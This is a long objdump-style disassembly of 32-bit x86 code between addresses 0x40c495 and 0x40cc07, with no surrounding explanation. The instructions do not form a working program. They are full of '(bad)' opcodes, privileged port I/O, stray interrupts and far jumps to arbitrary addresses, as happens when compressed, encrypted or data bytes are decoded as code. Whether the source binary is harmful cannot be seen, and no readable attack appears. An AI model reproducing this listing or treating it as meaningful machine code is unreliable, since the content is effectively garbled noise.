  40c495:	or     eax,0x567658b1
  40c49a:	aam    0xfc
  40c49c:	ret    
  40c49d:	ja     0x40c47a
  40c49f:	mov    ebx,0xbf6dc614
  40c4a4:	stos   BYTE PTR es:[edi],al
  40c4a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4a7:	jbe    0x40c4a0
  40c4a9:	dec    edx
  40c4aa:	lds    ebp,FWORD PTR [edi]
  40c4ac:	ret    0xcaae
  40c4af:	inc    ebx
  40c4b0:	jne    0x40c47a
  40c4b2:	test   DWORD PTR ds:0x3138a456,edx
  40c4b8:	outs   dx,DWORD PTR ds:[esi]
  40c4b9:	sti    
  40c4ba:	lods   al,BYTE PTR ds:[esi]
  40c4bb:	jnp    0x40c4db
  40c4bd:	jae    0x40c45b
  40c4bf:	ins    DWORD PTR es:[edi],dx
  40c4c0:	popf   
  40c4c1:	sub    DWORD PTR [edi],eax
  40c4c3:	cmp    al,0xcd
  40c4c5:	(bad)  
  40c4c6:	idiv   DWORD PTR [edi]
  40c4c8:	xchg   cl,al
  40c4ca:	and    eax,0x58d88bfd
  40c4cf:	ins    BYTE PTR es:[edi],dx
  40c4d0:	fadd   st(1),st
  40c4d2:	loopne 0x40c550
  40c4d4:	out    dx,al
  40c4d5:	mov    al,ds:0xfdfac9f8
  40c4da:	ins    DWORD PTR es:[edi],dx
  40c4db:	xor    ah,BYTE PTR [esi+ebx*4+0x1e]
  40c4df:	mov    DWORD PTR [edi+0x1b683c84],ecx
  40c4e5:	xlat   BYTE PTR ds:[ebx]
  40c4e6:	sub    edx,DWORD PTR [esi]
  40c4e8:	sar    BYTE PTR [ebp-0x4bdd5431],cl
  40c4ee:	xchg   esp,eax
  40c4ef:	ret    
  40c4f0:	int    0x52
  40c4f2:	cwde   
  40c4f3:	in     eax,0x25
  40c4f5:	adc    ebp,DWORD PTR [ebp-0x4ebd21aa]
  40c4fb:	mov    ds:0x42535329,al
  40c500:	and    BYTE PTR [ecx-0x39],dl
  40c503:	into   
  40c504:	test   BYTE PTR [ebx-0x327a5912],dh
  40c50a:	mov    esp,0x72ef9e27
  40c50f:	shl    DWORD PTR [edx+0x40],cl
  40c512:	and    al,0x9d
  40c514:	leave  
  40c515:	jae    0x2426664b
  40c51b:	imul   ebp,DWORD PTR [ebx+ebx*8],0x228f5062
  40c522:	jae    0x40c4f6
  40c524:	call   0xa3dcb353
  40c529:	sbb    dh,BYTE PTR [ecx]
  40c52b:	(bad)  
  40c52c:	mul    al
  40c52e:	push   es
  40c52f:	jecxz  0x40c509
  40c531:	push   edx
  40c532:	retf   
  40c533:	cmp    ecx,ecx
  40c535:	(bad)  
  40c536:	mov    dh,ah
  40c538:	push   ebp
  40c539:	xchg   ebx,eax
  40c53a:	adc    DWORD PTR [edi-0x152c4104],edi
  40c540:	sbb    bl,bh
  40c542:	sub    eax,0xb79e8b43
  40c547:	in     al,0xae
  40c549:	fld    TBYTE PTR [edx+0x469a22ec]
  40c54f:	xor    al,0x5e
  40c551:	sub    dh,BYTE PTR [ecx]
  40c553:	jge    0x40c565
  40c555:	pop    es
  40c556:	adc    eax,0x6d5c3e40
  40c55b:	mov    dh,0xe7
  40c55d:	(bad)  
  40c55e:	xor    al,0x9a
  40c560:	push   edx
  40c561:	out    dx,al
  40c562:	add    al,0xc6
  40c564:	pop    ecx
  40c565:	jmp    FWORD PTR [ecx+0x73]
  40c568:	(bad)  
  40c569:	fwait
  40c56a:	fwait
  40c56b:	cmp    BYTE PTR [esi+0x56],bh
  40c56e:	bound  edi,QWORD PTR [esi+edi*4]
  40c571:	in     eax,dx
  40c572:	dec    ecx
  40c573:	inc    ebp
  40c574:	mov    gs:0x228682bc,al
  40c57a:	in     al,0x4
  40c57c:	inc    eax
  40c57d:	mov    edi,0x25950296
  40c582:	pusha  
  40c583:	pop    ebp
  40c584:	adc    eax,0x4dec3e5d
  40c589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c58a:	imul   edx,DWORD PTR [ecx],0xa75625a6
  40c590:	sub    ch,dl
  40c592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c593:	inc    edi
  40c594:	enter  0x771e,0xd3
  40c598:	mov    cl,0x83
  40c59a:	fnstsw WORD PTR ss:[edi+0x67]
  40c59e:	rol    ecx,1
  40c5a0:	mov    gs,edx
  40c5a2:	xor    ch,BYTE PTR [edi+0x6b]
  40c5a5:	or     DWORD PTR [eax+0x33],ebp
  40c5a8:	pop    esp
  40c5a9:	xor    eax,0x4e3c026
  40c5ae:	psrld  mm5,QWORD PTR [edi]
  40c5b1:	xor    eax,0xa04861e7
  40c5b6:	xor    eax,0x94d63c36
  40c5bb:	cmp    BYTE PTR [ecx+0x178f85c7],bh
  40c5c1:	push   esi
  40c5c2:	push   edi
  40c5c3:	mov    eax,ds:0x7fa12c3d
  40c5c8:	and    edi,esi
  40c5ca:	retf   0x7fed
  40c5cd:	or     al,0x26
  40c5cf:	jp     0x40c5dd
  40c5d1:	adc    edi,DWORD PTR [esi+0x5106d8f6]
  40c5d7:	int    0x8b
  40c5d9:	xor    eax,0xa78316ad
  40c5de:	jg     0x40c5f9
  40c5e0:	adc    DWORD PTR [ebx],edx
  40c5e2:	jmp    0xbcb42304
  40c5e7:	js     0x40c64b
  40c5e9:	jae    0x40c668
  40c5eb:	jp     0x40c635
  40c5ed:	in     al,dx
  40c5ee:	test   BYTE PTR [ecx],dh
  40c5f0:	mov    eax,ds:0xea8989df
  40c5f5:	fdivr  QWORD PTR [ecx]
  40c5f7:	fst    QWORD PTR ds:0xb6f09440
  40c5fd:	push   ss
  40c5fe:	fisttp QWORD PTR [eax+eax*1-0x62404563]
  40c605:	cmp    eax,0x7ec0b839
  40c60a:	arpl   WORD PTR [edx],bp
  40c60c:	adc    dl,BYTE PTR [bx-0x6f0]
  40c611:	shl    BYTE PTR [ecx],0x1b
  40c614:	hlt    
  40c615:	push   esp
  40c616:	jl     0x40c5c6
  40c618:	xchg   esi,eax
  40c619:	lea    esi,[ecx-0x3f]
  40c61c:	sbb    ebx,DWORD PTR [ecx]
  40c61e:	and    BYTE PTR [ebx+0x4b703b13],dh
  40c624:	xor    DWORD PTR [edi],0xa8d7776d
  40c62a:	stos   BYTE PTR es:[edi],al
  40c62b:	cli    
  40c62c:	cdq    
  40c62d:	stos   DWORD PTR es:[edi],eax
  40c62e:	cmp    ah,cl
  40c630:	adc    BYTE PTR [ecx+0x3],0x9b
  40c634:	dec    eax
  40c635:	adc    dh,BYTE PTR [edx+0x6726aca2]
  40c63b:	mov    edx,0xe72760e9
  40c640:	add    eax,0x6ff7d9c5
  40c645:	retf   0x7abe
  40c648:	jecxz  0x40c65e
  40c64a:	add    DWORD PTR [edx],edi
  40c64c:	test   DWORD PTR [esi],ebx
  40c64e:	(bad)  
  40c64f:	jl     0x40c60d
  40c651:	xchg   edi,eax
  40c652:	test   al,0xe0
  40c654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c655:	jnp    0x40c61f
  40c657:	imul   ebp,DWORD PTR [ebx+0x16d62a60],0x9d7550f0
  40c661:	push   edi
  40c662:	mov    eax,ds:0xe9e0c61a
  40c667:	out    dx,eax
  40c668:	clc    
  40c669:	and    dh,BYTE PTR [esi]
  40c66b:	push   ebx
  40c66c:	mov    cl,0xaa
  40c66e:	lods   eax,DWORD PTR ds:[esi]
  40c66f:	push   esi
  40c670:	xor    DWORD PTR [ecx+0x52],ecx
  40c673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c674:	mov    edi,0x737f32b8
  40c679:	cld    
  40c67a:	push   edi
  40c67b:	push   eax
  40c67c:	push   edx
  40c67d:	test   eax,0x2c86f292
  40c682:	xchg   esi,eax
  40c683:	lds    eax,FWORD PTR [esi]
  40c685:	add    dh,BYTE PTR [esi+0xc71243d]
  40c68b:	mov    edx,0xbe9c4464
  40c690:	push   cs
  40c691:	(bad)  
  40c692:	lods   eax,DWORD PTR ds:[esi]
  40c693:	cdq    
  40c694:	lods   al,BYTE PTR ds:[esi]
  40c695:	jno    0x40c67f
  40c697:	in     eax,dx
  40c698:	mov    ebp,0x372b4323
  40c69d:	jns    0x40c6a6
  40c69f:	outs   dx,BYTE PTR ds:[esi]
  40c6a0:	lock in al,dx
  40c6a2:	push   edx
  40c6a3:	sub    eax,0x2c69aaa4
  40c6a8:	sub    bl,dh
  40c6aa:	push   ds
  40c6ab:	(bad)  
  40c6ad:	adc    eax,0x98062e71
  40c6b2:	call   0xcce2:0x17c3eb42
  40c6b9:	lahf   
  40c6ba:	enter  0xd698,0x7c
  40c6be:	push   ebx
  40c6bf:	sbb    eax,0x72906230
  40c6c4:	and    eax,ebx
  40c6c6:	and    esi,eax
  40c6c8:	push   ebp
  40c6c9:	push   ecx
  40c6ca:	push   ecx
  40c6cb:	or     BYTE PTR ds:0x82ea4d3d,al
  40c6d1:	out    0x38,al
  40c6d3:	jle    0x40c6ba
  40c6d5:	adc    al,0x52
  40c6d7:	call   FWORD PTR [ebp+0xb0cde83]
  40c6dd:	out    0xf8,eax
  40c6df:	jae    0x40c6dd
  40c6e1:	push   di
  40c6e3:	adc    ecx,DWORD PTR [ebx]
  40c6e5:	add    eax,0xef44ba28
  40c6ea:	out    dx,al
  40c6eb:	pop    edx
  40c6ec:	call   0x85daca83
  40c6f1:	pusha  
  40c6f2:	stos   BYTE PTR es:[edi],al
  40c6f3:	sbb    DWORD PTR [ebp-0x25c10aa1],edi
  40c6f9:	mov    dh,0xb1
  40c6fb:	cmp    al,0xd1
  40c6fd:	lods   eax,DWORD PTR ds:[esi]
  40c6fe:	(bad)  
  40c6ff:	jle    0x40c6da
  40c701:	inc    ebx
  40c702:	inc    ecx
  40c703:	popa   
  40c704:	cmp    al,0x82
  40c706:	fmul   DWORD PTR [eax]
  40c708:	jb     0x40c6bb
  40c70a:	retf   
  40c70b:	mov    WORD PTR [ecx-0x66],fs
  40c70e:	xor    al,0xce
  40c710:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c711:	(bad)  
  40c712:	cmc    
  40c713:	or     bl,bh
  40c715:	mov    bh,0xdc
  40c717:	sub    esi,eax
  40c719:	add    eax,0x2a3f5a93
  40c71e:	sahf   
  40c71f:	mov    eax,0xfeec50f2
  40c724:	push   ecx
  40c725:	stos   BYTE PTR es:[edi],al
  40c726:	dec    ecx
  40c727:	out    0xb,al
  40c729:	pop    DWORD PTR [esi-0x75476e6a]
  40c72f:	scas   eax,DWORD PTR es:[edi]
  40c730:	hlt    
  40c731:	in     eax,0x11
  40c733:	les    esi,FWORD PTR [ebp-0x49c3a20c]
  40c739:	or     DWORD PTR [edi+0x33],ebx
  40c73c:	fsubr  DWORD PTR [edx]
  40c73e:	and    al,0xb4
  40c740:	pop    es
  40c741:	mov    esp,0x275c589f
  40c746:	daa    
  40c747:	out    0x5d,eax
  40c749:	scas   eax,DWORD PTR es:[edi]
  40c74a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c74b:	pop    eax
  40c74c:	neg    dl
  40c74e:	popf   
  40c74f:	mov    edx,0x8d998279
  40c754:	rol    dl,cl
  40c756:	scas   al,BYTE PTR es:[edi]
  40c757:	jecxz  0x40c6fb
  40c759:	nop
  40c75a:	jae    0x40c6e1
  40c75c:	jle    0x40c787
  40c75e:	cmp    esi,DWORD PTR [eax+0x3d5001af]
  40c764:	icebp  
  40c765:	pop    ecx
  40c766:	test   al,bh
  40c768:	pop    ebp
  40c769:	clc    
  40c76a:	loopne 0x40c6fd
  40c76c:	jns    0x40c7cd
  40c76e:	loop   0x40c7ab
  40c770:	call   0xf1faca17
  40c775:	stos   BYTE PTR es:[edi],al
  40c776:	mov    bl,0xd6
  40c778:	lahf   
  40c779:	(bad)  
  40c77a:	xchg   edx,eax
  40c77b:	push   ebx
  40c77c:	lods   eax,DWORD PTR ds:[esi]
  40c77d:	jns    0x40c705
  40c77f:	or     eax,0x5f6c7f4
  40c784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c785:	sub    ch,bh
  40c787:	test   esi,ebp
  40c789:	fidivr WORD PTR [ebx-0x44]
  40c78c:	mov    ecx,0x4c7f9c0a
  40c791:	push   ebp
  40c792:	addr16 pushf 
  40c794:	adc    ecx,0xffffffa0
  40c797:	(bad)  
  40c798:	jmp    0xea22:0xa3e80a7a
  40c79f:	stos   DWORD PTR es:[edi],eax
  40c7a0:	data16 mov bl,0xc9
  40c7a3:	jmp    0xc2d4:0xbaa45adc
  40c7aa:	jnp    0x40c74e
  40c7ac:	mov    ch,0x2d
  40c7ae:	add    al,0xf4
  40c7b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7b1:	jae    0x40c7c0
  40c7b3:	dec    ecx
  40c7b4:	push   edi
  40c7b5:	pop    esi
  40c7b6:	or     al,0xbb
  40c7b8:	fiadd  DWORD PTR [esi+0x71737331]
  40c7be:	sbb    ch,0xe8
  40c7c1:	in     al,0xb2
  40c7c3:	lods   eax,DWORD PTR ds:[esi]
  40c7c4:	test   eax,0x54f98fff
  40c7c9:	(bad)  
  40c7cb:	jne    0x40c80e
  40c7cd:	pop    ds
  40c7ce:	and    BYTE PTR [eax+0x4f24b813],ah
  40c7d4:	inc    esi
  40c7d5:	es jbe 0x40c78f
  40c7d8:	add    ch,ch
  40c7da:	cs stc 
  40c7dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7dd:	pop    es
  40c7de:	ds call 0x7e7c:0xa3b360a
  40c7e6:	cmp    al,0xc9
  40c7e8:	lock xacquire xor BYTE PTR [eax-0x7c23d59f],bl
  40c7f0:	enter  0xf1a9,0x91
  40c7f4:	mov    ah,BYTE PTR [ebx+0xd4bc27f]
  40c7fa:	inc    esp
  40c7fb:	xor    ch,BYTE PTR [eax+0x68dc1eb2]
  40c801:	sub    DWORD PTR [eax-0x15d6c5cf],esp
  40c807:	call   0x473f:0xe517cd78
  40c80e:	jnp    0x40c7c8
  40c810:	retf   
  40c811:	arpl   ax,bp
  40c813:	push   ss
  40c814:	pop    ss
  40c815:	stos   DWORD PTR es:[edi],eax
  40c816:	es push ebp
  40c818:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c819:	mov    ebx,0x95c4a01a
  40c81e:	inc    ecx
  40c81f:	out    dx,eax
  40c820:	pop    edi
  40c821:	inc    edx
  40c822:	push   ds
  40c823:	xor    BYTE PTR [edi],0x2e
  40c826:	and    eax,0x61e15fed
  40c82b:	lods   eax,DWORD PTR ds:[esi]
  40c82c:	jp     0x40c853
  40c82e:	cmp    al,0x36
  40c830:	daa    
  40c831:	arpl   WORD PTR [edi],bx
  40c833:	mov    ecx,0xd5ee8075
  40c838:	dec    esi
  40c839:	data16 jl 0x40c7d2
  40c83c:	jns    0x40c7c9
  40c83e:	inc    edi
  40c83f:	mov    dh,dl
  40c841:	dec    ebp
  40c842:	call   DWORD PTR [ebx-0x9d8925e]
  40c848:	xor    al,ah
  40c84a:	push   es
  40c84b:	jae    0x40c887
  40c84d:	cmp    DWORD PTR [edx-0x7f6085bd],0xffffff92
  40c854:	imul   ebx,DWORD PTR [ebx-0x7960474e],0x260c880e
  40c85e:	repnz bound edx,QWORD PTR [eax+0x36]
  40c862:	dec    ebp
  40c863:	push   ecx
  40c864:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c865:	(bad)  
  40c866:	jns    0x40c88c
  40c868:	in     al,0xb0
  40c86a:	imul   ecx,DWORD PTR [eax],0xfffffff0
  40c86d:	mov    bh,0x22
  40c86f:	dec    ebp
  40c870:	mov    ebp,0x2d7cb1c0
  40c875:	jmp    0x40c80d
  40c877:	mov    ebx,0x526e22a2
  40c87c:	js     0x40c800
  40c87e:	adc    cl,BYTE PTR [edx-0x3a6cb4ce]
  40c884:	cmp    al,0x5e
  40c886:	inc    esp
  40c887:	cmp    bl,BYTE PTR ss:[eax]
  40c88a:	xor    al,0x88
  40c88c:	mov    ebp,ecx
  40c88e:	shl    DWORD PTR [edx],1
  40c890:	xchg   esi,eax
  40c891:	add    esi,DWORD PTR [ecx-0x51]
  40c894:	mov    ah,0xa7
  40c896:	retf   
  40c897:	data16 fwait
  40c899:	jb     0x40c8de
  40c89b:	mov    al,0x67
  40c89d:	stos   DWORD PTR es:[edi],eax
  40c89e:	and    eax,0xe2cd0c09
  40c8a3:	lods   eax,DWORD PTR ds:[esi]
  40c8a4:	and    bh,ah
  40c8a6:	sub    bh,BYTE PTR [eax]
  40c8a8:	mov    al,0xe
  40c8aa:	jb     0x40c834
  40c8ac:	jecxz  0x40c90e
  40c8ae:	xchg   DWORD PTR [edi-0x44959604],edi
  40c8b4:	xor    ebx,DWORD PTR [eax-0x75]
  40c8b7:	jg     0x40c841
  40c8b9:	jne    0x40c8be
  40c8bb:	mov    ah,al
  40c8bd:	pusha  
  40c8be:	inc    ecx
  40c8bf:	xchg   ebp,eax
  40c8c0:	imul   esi,DWORD PTR [eax],0x94346877
  40c8c6:	and    eax,0xd57a0dc7
  40c8cb:	cmp    al,0x7a
  40c8cd:	mov    cl,0x7f
  40c8cf:	ins    BYTE PTR es:[edi],dx
  40c8d0:	sbb    BYTE PTR [edi],ah
  40c8d2:	(bad)  
  40c8d4:	cmp    eax,DWORD PTR [ecx-0x13]
  40c8d7:	or     BYTE PTR [ecx],dh
  40c8d9:	inc    ecx
  40c8da:	sbb    DWORD PTR [edx-0x1e326f0f],esi
  40c8e0:	repnz xchg ecx,eax
  40c8e2:	out    0xea,al
  40c8e4:	cwde   
  40c8e5:	fild   WORD PTR [eax-0x49]
  40c8e8:	lea    edx,[eax]
  40c8ea:	pop    ebp
  40c8eb:	push   ebp
  40c8ec:	pop    edi
  40c8ed:	push   esp
  40c8ee:	push   0x17d77e71
  40c8f3:	xor    esi,DWORD PTR [esi-0x239c608c]
  40c8f9:	xor    al,0x5f
  40c8fb:	mov    esi,0xbd74e65c
  40c900:	xor    esi,DWORD PTR ss:[ecx+0x57]
  40c904:	push   ds
  40c905:	push   esp
  40c906:	cmc    
  40c907:	das    
  40c908:	cmp    al,0xc1
  40c90a:	mov    bl,0xbb
  40c90c:	xor    dl,al
  40c90e:	jle    0x40c8ed
  40c910:	mov    ecx,0x3cb00389
  40c915:	test   DWORD PTR [eax],edx
  40c917:	xor    DWORD PTR [esi-0xf8d09bf],ecx
  40c91d:	mov    DWORD PTR [ecx+0x3f],edi
  40c920:	outs   dx,DWORD PTR ds:[esi]
  40c921:	test   eax,0xd143683d
  40c926:	(bad)  
  40c928:	mov    ebx,0x7efc482a
  40c92d:	mov    DWORD PTR [edx+0x26],esp
  40c930:	rcl    DWORD PTR [edi+ecx*2],0x10
  40c934:	push   eax
  40c935:	inc    ebx
  40c936:	push   edi
  40c937:	ins    BYTE PTR es:[edi],dx
  40c938:	dec    ebx
  40c939:	push   ds
  40c93a:	out    0xef,eax
  40c93c:	xchg   ebp,eax
  40c93d:	(bad)  
  40c93e:	int    0x17
  40c940:	test   ch,0x95
  40c943:	push   ecx
  40c944:	(bad)  
  40c945:	jns    0x40c8db
  40c947:	mov    edi,0x1628ff0b
  40c94c:	pop    ecx
  40c94d:	test   edx,edi
  40c94f:	stos   DWORD PTR es:[edi],eax
  40c950:	sub    DWORD PTR [ebx+0x681ef554],ecx
  40c956:	mov    ds:0x8f4b6676,al
  40c95b:	add    bh,BYTE PTR [esi+0x285e29c2]
  40c961:	mov    dl,0x1c
  40c963:	mov    ch,0x33
  40c965:	test   BYTE PTR [ebx+ebp*2+0x1a],bh
  40c969:	pusha  
  40c96a:	xchg   edx,eax
  40c96b:	stc    
  40c96c:	fdivr  DWORD PTR [edx+0x2e]
  40c96f:	mov    esp,0x4ebec51b
  40c974:	ins    BYTE PTR es:[edi],dx
  40c975:	push   ebp
  40c976:	sub    DWORD PTR [edx+0x7e],ebx
  40c979:	adc    DWORD PTR [edi-0xa],esi
  40c97c:	in     eax,0xf5
  40c97e:	push   0x5c
  40c980:	mov    BYTE PTR [ebp+0x2b2ec3],dh
  40c986:	fwait
  40c987:	test   BYTE PTR [ebp+0xa],dh
  40c98a:	cs scas eax,DWORD PTR es:[edi]
  40c98c:	jle    0x40c991
  40c98e:	ret    
  40c98f:	mov    esi,0xfec02168
  40c994:	shl    BYTE PTR [ecx+0x27],1
  40c997:	push   0x2765cd76
  40c99c:	shl    al,0x36
  40c99f:	or     eax,0x6037f37d
  40c9a4:	cmp    ah,ch
  40c9a6:	aas    
  40c9a7:	pop    edi
  40c9a8:	mov    esi,0xc2ed14d3
  40c9ad:	push   0xfffffffa
  40c9af:	cwde   
  40c9b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9b1:	xchg   DWORD PTR [edx],edi
  40c9b3:	lea    edx,[esi+eiz*2+0x5f]
  40c9b7:	(bad)  
  40c9b8:	out    dx,eax
  40c9b9:	mov    dh,0x9e
  40c9bb:	loop   0x40c97c
  40c9bd:	xor    ebp,esi
  40c9bf:	sub    eax,esi
  40c9c1:	imul   esi,eax,0x19
  40c9c4:	mov    dl,0x1e
  40c9c6:	js     0x40c9f8
  40c9c8:	nop
  40c9c9:	ds (bad) 
  40c9cb:	sbb    DWORD PTR [edx+0x4a21fa58],0x88d38834
  40c9d5:	jns    0x40ca4b
  40c9d7:	inc    edx
  40c9d8:	push   0x10ff1e20
  40c9dd:	sub    al,0x37
  40c9df:	jb     0x40ca4a
  40c9e1:	jne    0x40c97c
  40c9e3:	add    eax,0x81484c55
  40c9e8:	jne    0x40ca4b
  40c9ea:	std    
  40c9eb:	test   eax,0x4aff4f17
  40c9f0:	mov    al,ds:0x4b7abec6
  40c9f5:	out    dx,al
  40c9f6:	aaa    
  40c9f7:	xlat   BYTE PTR ds:[ebx]
  40c9f8:	test   al,0x29
  40c9fa:	gs shl esp,cl
  40c9fd:	repnz push cs
  40c9ff:	daa    
  40ca00:	bound  ecx,QWORD PTR [edi+edx*4+0x34c0eb4e]
  40ca07:	div    BYTE PTR [ebx+0x4808b880]
  40ca0d:	loop   0x40ca36
  40ca0f:	ins    DWORD PTR es:[edi],dx
  40ca10:	lods   al,BYTE PTR ds:[esi]
  40ca11:	sbb    DWORD PTR [eax-0x5d212e9d],0xdadee169
  40ca1b:	mov    cl,0x7b
  40ca1d:	clc    
  40ca1e:	adc    BYTE PTR [eax+0x64],ah
  40ca21:	sbb    BYTE PTR [eax+ecx*1+0x411d9e8f],dl
  40ca28:	or     DWORD PTR [eax+eax*4+0x21],eax
  40ca2c:	call   0x766e:0x7a7f68d9
  40ca33:	inc    DWORD PTR [ebx]
  40ca35:	mov    ecx,0x5a6d5ef3
  40ca3a:	daa    
  40ca3b:	stos   DWORD PTR es:[edi],eax
  40ca3c:	ja     0x40c9cf
  40ca3e:	xchg   esp,eax
  40ca3f:	xchg   edi,eax
  40ca40:	dec    edx
  40ca41:	clc    
  40ca42:	mov    bh,0xf7
  40ca44:	mov    edi,0xfbfb00ca
  40ca49:	retf   0x9db
  40ca4c:	jno    0x90616d11
  40ca52:	std    
  40ca53:	or     DWORD PTR [edx-0x66ea5d70],esp
  40ca59:	in     eax,0x21
  40ca5b:	ins    BYTE PTR es:[edi],dx
  40ca5c:	int    0xe8
  40ca5e:	clc    
  40ca5f:	push   ds
  40ca60:	pop    esi
  40ca61:	daa    
  40ca62:	loope  0x40ca9c
  40ca64:	add    ebx,esp
  40ca66:	repnz mov ebx,0x7ded42d8
  40ca6c:	jmp    0x6322:0x3bf642d8
  40ca73:	dec    dh
  40ca75:	aad    0x9d
  40ca77:	and    DWORD PTR [edi-0x61],esi
  40ca7a:	stc    
  40ca7b:	out    0x2b,al
  40ca7d:	std    
  40ca7e:	cmp    eax,0x489ac3f3
  40ca83:	push   cs
  40ca84:	jge    0x40ca7a
  40ca86:	rcl    DWORD PTR [esi+0x7eeeec87],0x88
  40ca8d:	xchg   edx,eax
  40ca8e:	xor    DWORD PTR [esi-0x1f],0x36a86924
  40ca95:	inc    edi
  40ca96:	(bad)  
  40ca97:	repz cmp eax,0x71095e6f
  40ca9d:	inc    esp
  40ca9e:	hlt    
  40ca9f:	mov    fs,ecx
  40caa1:	mov    esi,0x658510b3
  40caa6:	push   es
  40caa7:	(bad)  
  40caa9:	inc    BYTE PTR [edx+0x33369db0]
  40caaf:	addr16 push edx
  40cab1:	sub    DWORD PTR [edi],esi
  40cab3:	mov    edi,0x82d7f403
  40cab8:	clc    
  40cab9:	int    0x0
  40cabb:	lods   al,BYTE PTR ds:[esi]
  40cabc:	js     0x40cb1f
  40cabe:	lea    esp,[edx-0x2bf377ea]
  40cac4:	daa    
  40cac5:	jmp    0xc53c8672
  40caca:	addr16 imul eax,ebp,0x5d2e2004
  40cad1:	adc    al,0x27
  40cad3:	mov    esi,esp
  40cad5:	add    eax,0xaa577940
  40cada:	lods   eax,DWORD PTR ds:[esi]
  40cadb:	int3   
  40cadc:	aam    0xc3
  40cade:	dec    ecx
  40cadf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cae0:	and    eax,0xb7f193d4
  40cae5:	les    ebx,FWORD PTR [ecx+esi*1]
  40cae8:	jns    0x40cab9
  40caea:	ja     0x40cb57
  40caec:	addr16 push ss
  40caee:	ja     0x40cac0
  40caf0:	add    al,0xdb
  40caf2:	push   esp
  40caf3:	jne    0x40cb73
  40caf5:	add    DWORD PTR [ebx+0x69513786],edi
  40cafb:	rcr    DWORD PTR ds:[ecx],1
  40cafe:	ret    0x40bc
  40cb01:	repz adc eax,0xc358b354
  40cb07:	in     al,0xc6
  40cb09:	sbb    eax,0x343a9ee4
  40cb0e:	push   ecx
  40cb0f:	xchg   BYTE PTR [edx-0x5a],al
  40cb12:	jmp    0xd972:0x87cda30f
  40cb19:	stc    
  40cb1a:	add    al,0x78
  40cb1c:	out    0xb8,eax
  40cb1e:	test   BYTE PTR [esi-0x43c8ca56],bl
  40cb24:	in     eax,dx
  40cb25:	adc    ch,BYTE PTR ds:0xd44cf640
  40cb2b:	repz (bad) 
  40cb2d:	cdq    
  40cb2e:	sbb    edi,DWORD PTR [edx+0x51d89340]
  40cb34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb35:	push   edi
  40cb36:	cmp    al,0xea
  40cb38:	jno    0x40cadf
  40cb3a:	cmp    dl,cl
  40cb3c:	inc    esi
  40cb3d:	or     al,0x12
  40cb3f:	and    eax,0x2f7a6de7
  40cb44:	or     ebx,DWORD PTR [edx-0x50]
  40cb47:	test   al,0xa8
  40cb4a:	cwde   
  40cb4b:	(bad)  
  40cb4d:	cmp    BYTE PTR [di],dh
  40cb50:	inc    ebx
  40cb51:	xor    DWORD PTR [ebx-0x7649bcc5],esi
  40cb57:	jbe    0x40cb07
  40cb59:	in     eax,dx
  40cb5a:	loope  0x40cb82
  40cb5c:	cmc    
  40cb5d:	sbb    ebx,DWORD PTR [eax+0x57]
  40cb60:	jmp    0xa660:0x2097ac03
  40cb67:	mov    cl,0xd2
  40cb69:	test   DWORD PTR [edx+eiz*1],ebx
  40cb6c:	xor    eax,0xa244703c
  40cb71:	out    0xd,al
  40cb73:	or     esi,edx
  40cb75:	mov    dh,BYTE PTR [ecx+0x39]
  40cb78:	mov    WORD PTR [edx],cs
  40cb7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb7b:	xchg   esi,eax
  40cb7c:	(bad)  
  40cb7e:	jp     0x40cb94
  40cb80:	inc    edi
  40cb81:	addr16 and al,0x26
  40cb84:	icebp  
  40cb85:	popf   
  40cb86:	jmp    FWORD PTR [eax-0x73493b42]
  40cb8c:	mov    ch,0xd6
  40cb8e:	jb     0x40cb1c
  40cb90:	mov    ds:0x4f7a986,al
  40cb95:	adc    DWORD PTR [ebp-0xb0cb6bb],0x3b
  40cb9c:	stos   DWORD PTR es:[edi],eax
  40cb9d:	xchg   ebx,eax
  40cb9e:	add    BYTE PTR [esi+0x7585d611],bh
  40cba4:	sbb    BYTE PTR [ecx-0x1d],ah
  40cba7:	stos   BYTE PTR es:[edi],al
  40cba8:	jmp    0xb82d348c
  40cbad:	dec    ecx
  40cbae:	or     eax,0xca38a089
  40cbb3:	xchg   edi,eax
  40cbb4:	lds    ebp,FWORD PTR [esi+ebx*2]
  40cbb7:	push   0xffffffd8
  40cbb9:	adc    eax,0x657147cc
  40cbbe:	cmp    BYTE PTR [ecx],dh
  40cbc0:	push   esp
  40cbc1:	call   0x5972ddf6
  40cbc6:	add    DWORD PTR [esi+0x3e],edi
  40cbc9:	xchg   esi,eax
  40cbca:	xchg   esp,eax
  40cbcb:	ja     0x40cc34
  40cbcd:	cmp    bh,cl
  40cbcf:	mov    al,ds:0x25ebc14
  40cbd4:	ins    BYTE PTR es:[edi],dx
  40cbd5:	xchg   edi,eax
  40cbd6:	aad    0x8d
  40cbd8:	loop   0x40cb5d
  40cbda:	push   ecx
  40cbdb:	inc    esp
  40cbdc:	sti    
  40cbdd:	pop    eax
  40cbde:	dec    esp
  40cbdf:	outs   dx,DWORD PTR ds:[esi]
  40cbe0:	(bad)  
  40cbe1:	repnz sti 
  40cbe3:	pop    edi
  40cbe4:	lock pop ebp
  40cbe6:	imul   esp,DWORD PTR [eax+0x3c],0x17b21fe6
  40cbed:	(bad)  ds:0xbd857bdc
  40cbf3:	in     al,0x0
  40cbf5:	sbb    eax,0xcfc1dfca
  40cbfa:	das    
  40cbfb:	clc    
  40cbfc:	sub    edi,DWORD PTR [ebp+0x4c4efc95]
  40cc02:	xor    al,0xe7
  40cc04:	xor    ecx,eax
  40cc06:	pop    esi
  40cc07:	add    DWORD PTR [ebx],esi
